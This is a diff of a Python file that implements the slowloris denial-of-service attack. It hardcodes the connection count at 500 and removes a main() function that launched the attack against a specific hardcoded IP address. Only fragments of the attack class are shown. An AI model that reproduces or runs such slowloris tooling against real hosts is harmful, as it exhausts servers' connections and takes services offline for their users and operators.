@@ -5,18 +5,16 @@ import time
 """
 An implementation of the slowloris DDoS attack (as written by
 RSnake).
-
-Put the rest of the explanation here
 """
 
 class Loris:
-    def __init__(self, addr, port = 80, totalConnections = 50):
+    def __init__(self, addr, port = 80):
         self.addr = addr
         self.port = port
-        self.totalConnections = totalConnections
         self.end = False
         
         self.threadList = []
+        self.totalConnections = 500
         self.connectionsPerThread = 10
         self.MAX_TIMEOUT = 30
 
@@ -129,10 +127,3 @@ class Loris:
             """ Sleep for timeout """
             print "Currently active connections: " + str(self.activeConnections)
             time.sleep(self.timeout)
-
-def main():
-    loris = Loris(addr = "54.69.185.61", port = 80, totalConnections = 200)
-    loris.initiateAttack()
-
-if __name__ == "__main__":
-    main()
